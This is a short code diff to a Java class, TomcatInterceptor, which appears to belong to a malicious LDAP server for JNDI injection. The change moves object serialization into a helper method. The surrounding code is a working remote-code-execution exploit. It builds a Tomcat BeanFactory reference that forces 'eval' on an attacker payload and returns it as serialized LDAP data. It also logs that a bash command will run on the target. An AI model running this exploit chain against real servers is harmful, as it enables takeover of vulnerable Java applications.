@@ -7,6 +7,7 @@ import com.unboundid.ldap.sdk.LDAPException;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
+import util.CommonUtil;
 
 import javax.naming.StringRefAddr;
 import java.io.ByteArrayOutputStream;
@@ -29,12 +30,10 @@ public class TomcatInterceptor implements LDAPInterceptor {
         ref.add(new StringRefAddr("forceString", "bbbar=eval"));
         ref.add(new StringRefAddr("bbbar", payload));
 
-        ByteArrayOutputStream bos = new ByteArrayOutputStream();
-        ObjectOutputStream oos = new ObjectOutputStream(bos);
-        oos.writeObject(ref);
+        byte[] data = CommonUtil.serialize(ref);
+        entry.addAttribute("javaSerializedData", data);
         System.out.printf("[LDAP] send serialized data BeanFactory ref >> execute command [bash -c '%s']", Config.command);
 
-        entry.addAttribute("javaSerializedData", bos.toByteArray());
         result.sendSearchEntry(entry);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
     }
